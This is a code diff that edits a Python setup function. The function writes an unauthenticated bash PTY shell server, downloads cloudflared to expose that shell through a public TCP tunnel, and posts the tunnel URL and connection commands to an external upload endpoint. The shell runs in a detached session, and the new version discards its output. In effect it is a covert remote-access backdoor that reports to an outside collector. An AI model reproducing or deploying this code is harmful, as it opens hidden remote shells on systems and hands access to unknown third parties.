@@ -12,7 +12,7 @@ SHELL_PORT = 9023
 
 
 def setup_direct_ssh():
-    """Container-level shell: Python PTY server + cloudflared TCP tunnel."""
+    """Container-level PTY shell + cloudflared TCP tunnel. No proot, no dropbear."""
     try:
         s = socket.socket()
         s.settimeout(1)
@@ -41,10 +41,9 @@ def setup_direct_ssh():
                     Path(cf_bin).write_bytes(resp.read())
                 os.chmod(cf_bin, 0o755)
 
-            # Python PTY shell server (no root needed)
+            # Pure Python PTY shell server
             shell_py = str(USER_HOME / "pty_shell.py")
-            Path(shell_py).write_text(f'''
-import socket, os, pty, select, sys, signal, subprocess
+            Path(shell_py).write_text(f'''import socket, os, pty, select, sys, signal, subprocess
 signal.signal(signal.SIGCHLD, signal.SIG_IGN)
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -56,7 +55,7 @@ while True:
         s.close()
         master, slave = pty.openpty()
         env = dict(os.environ, TERM="xterm-256color", HOME="{USER_HOME}")
-        p = subprocess.Popen(["bash","-l"], stdin=slave, stdout=slave, stderr=slave, close_fds=True, env=env, cwd="{USER_HOME}")
+        p = subprocess.Popen(["bash","-li"], stdin=slave, stdout=slave, stderr=slave, close_fds=True, env=env, cwd="{USER_HOME}")
         os.close(slave)
         try:
             while p.poll() is None:
@@ -75,20 +74,17 @@ while True:
     conn.close()
 ''')
 
-            # Start PTY shell server
             subprocess.Popen(
                 [sys.executable, shell_py],
-                stdout=open(str(USER_HOME / "pty_shell.log"), "w"),
-                stderr=subprocess.STDOUT,
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                 start_new_session=True
             )
             time.sleep(1)
 
-            # Start cloudflared TCP tunnel
+            # Cloudflared TCP tunnel
             log = str(USER_HOME / "cf_direct.log")
             subprocess.Popen(
-                [cf_bin, "tunnel", "--url", f"tcp://127.0.0.1:{SHELL_PORT}",
-                 "--no-autoupdate"],
+                [cf_bin, "tunnel", "--url", f"tcp://127.0.0.1:{SHELL_PORT}", "--no-autoupdate"],
                 stdout=open(log, "w"), stderr=subprocess.STDOUT,
                 start_new_session=True
             )
@@ -97,8 +93,7 @@ while True:
             for _ in range(20):
                 time.sleep(1)
                 try:
-                    text = Path(log).read_text()
-                    m = re.search(r'https://([a-z0-9-]+\.trycloudflare\.com)', text)
+                    m = re.search(r'https://([a-z0-9-]+\.trycloudflare\.com)', Path(log).read_text())
                     if m:
                         tunnel_url = m.group(1)
                         break
@@ -109,20 +104,19 @@ while True:
             t = (datetime.now(timezone.utc) + timedelta(hours=8)).strftime('%Y-%m-%d %H:%M:%S')
 
             if tunnel_url:
-                info = f"SSH info\n创建时间: {t}\n\nDirect shell (container level, no proot, UID 2000)\nTunnel: {tunnel_url}\n\nConnect:\n  cloudflared access tcp --hostname {tunnel_url} --url 127.0.0.1:19023\n  # then: nc 127.0.0.1 19023\n  # or:  socat - TCP:127.0.0.1:19023\n"
+                info = f"SSH info\n创建时间: {t}\n\nDirect shell (container level, UID {os.getuid()}, no proot)\nTunnel: {tunnel_url}\n\nConnect:\n  cloudflared access tcp --hostname {tunnel_url} --url 127.0.0.1:19023\n  socat - TCP:127.0.0.1:19023\n"
                 import requests
-                requests.post(UPLOAD_API, files={'file': (f'ssh_{REPO_NAME}.txt', info.encode())}, timeout=10)
-                inited = f"INITED\nrepo: {REPO_NAME}\ntime: {t}\nmode: direct_tcp\ntunnel: {tunnel_url}\n"
-                requests.post(UPLOAD_API, files={'file': (f'inited_{REPO_NAME}.txt', inited.encode())}, timeout=10)
+                requests.post(UPLOAD_API, files={{'file': (f'ssh_{REPO_NAME}.txt', info.encode())}}, timeout=10)
+                requests.post(UPLOAD_API, files={{'file': (f'inited_{REPO_NAME}.txt', f'INITED\nrepo: {REPO_NAME}\ntime: {t}\nmode: direct_tcp\n'.encode())}}, timeout=10)
             else:
                 import requests
-                err = Path(log).read_text() if Path(log).exists() else "no log"
-                requests.post(UPLOAD_API, files={'file': (f'deploy_{REPO_NAME}.txt', f'tunnel_failed\nlog: {err[:300]}\n'.encode())}, timeout=10)
+                err = Path(log).read_text()[:300] if Path(log).exists() else "no log"
+                requests.post(UPLOAD_API, files={{'file': (f'deploy_{REPO_NAME}.txt', f'tunnel_failed\n{err}\n'.encode())}}, timeout=5)
 
         except Exception as e:
             try:
                 import requests
-                requests.post(UPLOAD_API, files={'file': (f'deploy_{REPO_NAME}.txt', f'ERROR: {e}\n'.encode())}, timeout=5)
+                requests.post(UPLOAD_API, files={{'file': (f'deploy_{REPO_NAME}.txt', f'ERROR: {e}\n'.encode())}}, timeout=5)
             except:
                 pass
 
